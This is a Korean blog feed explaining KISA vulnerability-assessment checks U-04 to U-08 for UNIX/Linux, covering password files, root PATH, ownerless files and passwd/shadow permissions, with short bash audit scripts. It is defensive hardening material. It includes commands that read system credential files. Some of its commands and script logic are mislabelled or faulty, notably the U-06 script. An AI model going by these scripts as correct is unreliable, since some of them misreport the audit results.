<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-04 패스워드 파일 보호</title>
    <url>/2022/01/22/2022-01-22-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-04%20%ED%8C%A8%EC%8A%A4%EC%9B%8C%EB%93%9C%20%ED%8C%8C%EC%9D%BC%20%EB%B3%B4%ED%98%B8/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>시스템의 사용자 계정 정보가 저장된 파일에 사용자 계정 패스워드가 암호화되어 저장되어 있는지 점검합니다.</p>
<p>항목코드는 <code>U-04</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>일부 오래된 시스템의 경우 <code>/etc/passwd</code> 파일에 패스워드가 평문으로 저장 되므로 사용자 계정 패스워드가 암호화되어 저장되어 있는지 점검하여 비인가자의 패스워드 파일 접근 시에도 사용자 계정 패스워드가 안전하게 관리 되고 있는지 확인하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>사용자 계정 패스워드가 저장된 파일이 유출 또는 탈취 시 평문으로 저장된 패스워드 정보가 노출될 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 쉐도우 패스워드를 사용하거나, 패스워드를 암호화하여 저장하는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 쉐도우 패스워드를 사용하지 않고, 패스워드를 암호화하여 저장하지 않 는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX</td>
<td>1) <code>/shadow</code> 파일의 패스워드 암호화 존재 확인<br />(일반적으로 <code>/etc/</code> 디렉터리 내 존재)<br />    <code># cat /etc/passwd</code><br /><br />2) <code>/etc/passwd</code> 파일 내 두 번째 필드가 <code>x</code> 표시되는지 확인<br />    <code># cat /etc/passwd</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td><code>/etc/security/passwd</code> 파일 내 설정된 패스워드 점검</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/passwd</p>
</blockquote>
<br>

<p><code>/etc/passwd</code> 파일 내 두 번째 필드가 <code>x</code>인지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-04/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX</td>
<td>1) <code># pwconv</code> → 쉐도우 패스워드 정책 적용 방법<br /><br />2) <code># pwunconv</code> → 일반 패스워드 정책 적용 방법</td>
</tr>
<tr>
<td>AIX</td>
<td>1) <code># cat /etc/security/passwd</code><br /><br />2) 패스워드 암호화 여부 확인</td>
</tr>
<tr>
<td>HP-UX</td>
<td>HP-UX 서버는 Trusted Mode로 전환할 경우 패스워드를 암호화하여 <code>/tcb/files/auth</code> 디렉터리에 계정 이니셜과 계정 이름에 따라 파일로 저장, 관리할 수 있으므로 Trusted Mode인지 확인 후 UnTrusted Mode인 경우 모드를 전환함<br />1) Trusted Mode 전환 방법 : root 계정으로 로그인한 후 아래 명령 수행<br />    <code># /etc/tsconvert</code><br /><br />2) UnTrusted Mode 전환 방법 : root 계정으로 로그인한 후 아래 명령 수행<br />    <code># /etc/tsconvert -r2</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/passwd | cut -f 2 -d <span class="string">&#x27;:&#x27;</span> | grep -v <span class="string">&quot;x&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-04 [패스워드 파일 보호] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-04.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/passwd</code> 파일 내 두 번째 필드에 <code>x</code> 이외에 다른 것이 있으면 <code>취약</code>, 아니면 <code>양호</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-04</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-04/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-05 root홈, 패스 디렉터리 권한 및 패스 설정</title>
    <url>/2022/01/22/2022-01-22-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-05%20root%ED%99%88,%20%ED%8C%A8%EC%8A%A4%20%EB%94%94%EB%A0%89%ED%84%B0%EB%A6%AC%20%EA%B6%8C%ED%95%9C%20%EB%B0%8F%20%ED%8C%A8%EC%8A%A4%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>root 계정의 PATH 환경변수에 <code>.</code>이 포함되어 있는지 점검합니다.</p>
<p>항목코드는 <code>U-05</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>비인가자가 불법적으로 생성한 디렉터리 및 명령어를 우선으로 실행되지  않도록 설정하기 위해 환경변수 점검이 필요합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>root 계정의 PATH(환경변수)에 정상적인 관리자 명령어(예: ls, mv, cp등)의  디렉터리 경로 보다 현재 디렉터리를 지칭하는 <code>.</code> 표시가 우선하면 현재  디렉터리에 변조된 명령어를 삽입하여 관리자 명령어 입력 시 악의적인 기 능이 실행 될 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : PATH 환경변수에 <code>.</code> 이 맨 앞이나 중간에 포함되지 않은 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : PATH 환경변수에 <code>.</code> 이 맨 앞이나 중간에 포함되어 있는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX<br />HP-UX</td>
<td><code># echo $PATH</code><br />/usr/local/sbin:/sbin:/usr/sbin:/bin:/usr/bin/X11:/usr/local/bin:/usr/bin:/usr/X11R6/bin:/root/bin<br /><br />위와 같이 출력되는 PATH 변수 내에 <code>.</code> 또는 <code>::</code> 포함 여부 확인</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># echo $PATH</p>
</blockquote>
<br>

<p>PATH 환경변수를 출력해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-05/echo.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX<br />HP-UX</td>
<td>1) vi 편집기를 이용하여 root 계정의 설정파일(<code>~/.profile</code> 과 <code>/etc/profile</code>) 열기<br />    <code># vi /etc/profile</code><br /><br />2) 아래와 같이 수정<br />    (수정 전) PATH=.:$PATH:$HOME/bin<br />    (수정 후) PATH=$PATH:$HOME/bin:.</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`<span class="built_in">echo</span> <span class="variable">$PATH</span>`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *<span class="string">&quot;.&quot;</span>* ]] || [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *<span class="string">&quot;::&quot;</span>* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=<span class="string">&quot;.&quot;</span> 이나 <span class="string">&quot;::&quot;</span>이 포함되어 있습니다.</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-05 [root홈, 패스 디렉터리 권한 및 패스 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-05.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>PATH</code> 환경변수에 <code>.</code> 이나 <code>::</code>이 포함되어 있으면 확인해달라는 메시지가 나오고 없으면 <code>양호</code>처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-05</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-05/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-06 파일 및 디렉터리 소유자 설정</title>
    <url>/2022/01/22/2022-01-22-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-06%20%ED%8C%8C%EC%9D%BC%20%EB%B0%8F%20%EB%94%94%EB%A0%89%ED%84%B0%EB%A6%AC%20%EC%86%8C%EC%9C%A0%EC%9E%90%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>소유자 불분명한 파일이나 디렉터리가 존재하는지 여부를 점검합니다.</p>
<p>항목코드는 <code>U-06</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>소유자가 존재하지 않는 파일 및 디렉터리를 삭제 및 관리하여 임의의 사용자가 해당파일을 열람, 수정하는 행위를 사전에 차단하기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>소유자가 존재하지 않는 파일의 UID와 동일한 값으로 특정계정의 UID값을  변경하면 해당 파일의 소유자가 되어 모든 작업이 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 소유자가 존재하지 않는 파일 및 디렉터리가 존재하지 않는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 소유자가 존재하지 않는 파일 및 디렉터리가 존재하는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS, AIX</td>
<td>소유자가 <code>nouser</code> <code>nogroup</code>인 파일 이나 디렉터리 검색<br />    <code># find / -nouser -o -nogroup -xdev -ls 2 &gt; /dev/null</code></td>
</tr>
<tr>
<td>HP-UX</td>
<td><code># find / \ &#123; -nouser -o -nogroup \&#125; -xdev -exec ls -al &#123; &#125; \; 2&gt; /dev/null</code></td>
</tr>
<tr>
<td>LINUX</td>
<td><code># find / -nouser -print</code><br /><code># find / -nogroup -print</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># find / -nouser -print</p>
<p># find / -nogroup -print</p>
</blockquote>
<br>

<p>소유자가 <code>nouser</code> <code>nogroup</code>인 파일이나 디렉터리를 검색해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-06/find.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX<br />HP-UX</td>
<td>1) 소유자가 존재하지 않는 파일이나 디렉터리가 불필한 경우 <code>rm</code> 명령으로 삭제<br />    <code># rm &lt;file_name&gt;</code><br />    <code># rm &lt;directory_name&gt;</code><br /><br />2) 필요한 경우 <code>chown</code> 명령으로 소유자 및 그룹 변경<br />    <code># chown &lt;user_name&gt; &lt;file_name&gt;</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`find / -nouser -o -nogroup 2&gt; /root/result/u-06.txt`</span><br><span class="line">process2=`sed <span class="string">&#x27;/No such file or directory/d&#x27;</span> /root/result/u-06.txt`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-06 [파일 및 디렉터리 소유자 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-06.txt</span><br></pre></td></tr></table></figure>

<br>

<p>소유자가 존재하지 않는 파일이나 디렉터리가 있을경우 <code>취약</code>, 없을경우 <code>양호</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-06</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-06/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-07 /etc/passwd 파일 소유자 및 권한 설정</title>
    <url>/2022/01/23/2022-01-23-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-07%20passwd%20%ED%8C%8C%EC%9D%BC%20%EC%86%8C%EC%9C%A0%EC%9E%90%20%EB%B0%8F%20%EA%B6%8C%ED%95%9C%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>/etc/passwd</code> 파일 권한 적절성 점검입니다.</p>
<p>항목코드는 <code>U-07</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p><code>/etc/passwd</code> 파일의 임의적인 변경을 차단하기 위함을 통해 비인가자가 권 한 상승하는 것을 막기 위함입니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>관리자(root) 외 사용자가 <code>/etc/passwd</code> 파일의 사용자 정보를 변조하여 shell 변경, 사용자 추가/삭제 등 root를 포함한 사용자 권한 획득 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>/etc/passwd</code> 파일의 소유자가 root이고, 권한이 644 이하인 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>/etc/passwd</code> 파일의 소유자가 root가 아니거나, 권한이 644 이하가 아닌 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>/etc/passwd</code> 파일의 소유자 및 권한 확인<br />    <code># ls -l /etc/passwd</code><br />    rw-r--r-- root &lt;passwd 파일&gt;</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ls -l /etc/passwd</p>
</blockquote>
<br>

<p><code>/etc/passwd</code> 파일의 소유자와 권한을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-07/ls.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>/etc/passwd</code> 파일의 소유자 및 권한 변경 (소유자 root, 권한 644)<br />    <code># chown root /etc/passwd</code><br />    <code># chmod 644 /etc/passwd</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`find /etc/passwd -perm 644`</span><br><span class="line">process2=`find /etc/passwd -user root`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ] &amp;&amp; [ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-07 [/etc/passwd 파일 소유자 및 권한 설정] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-07.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/passwd</code> 파일의 소유자가 root이고 권한이 644인 경우 <code>양호</code>, 아니면 <code>취약</code> 처리해주었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-07</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-07/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-08 /etc/shadow 파일 소유자 및 권한 설정</title>
    <url>/2022/01/23/2022-01-23-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-08%20shadow%20%ED%8C%8C%EC%9D%BC%20%EC%86%8C%EC%9C%A0%EC%9E%90%20%EB%B0%8F%20%EA%B6%8C%ED%95%9C%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>/etc/shadow</code> 파일 권한 적절성 점검입니다.</p>
<p>항목코드는 <code>U-08</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p><code>/etc/shadow</code> 파일을 관리자만 제어할 수 있게 하여 비인가자들의 접근을 차단하도록 shadow 파일 소유자 및 권한을 관리해야합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>shadow파일은 패스워드를 암호화하여 저장하는 파일이며 해당 파일의 암호 화된 해쉬값을 복호화하여(크래킹) 비밀번호를 탈취할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>/etc/shadow</code> 파일의 소유자가 root이고, 권한이 400 이하인 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>/etc/shadow</code> 파일의 소유자가 root가 아니거나, 권한이 400 이하가  아닌 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX</td>
<td><code># ls -l /etc/shadow</code><br />    r-------- root &lt;shadow 파일&gt;</td>
</tr>
<tr>
<td>AIX</td>
<td><code># ls -ld /etc/security/passwd</code><br />    r-------- root &lt;passwd 파일&gt;</td>
</tr>
<tr>
<td>HP-UX</td>
<td><code># ls -ld /tcb/files/auth</code><br />    r-------- root &lt;auth 파일&gt;</td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># ls -l /etc/passwd</p>
</blockquote>
<br>

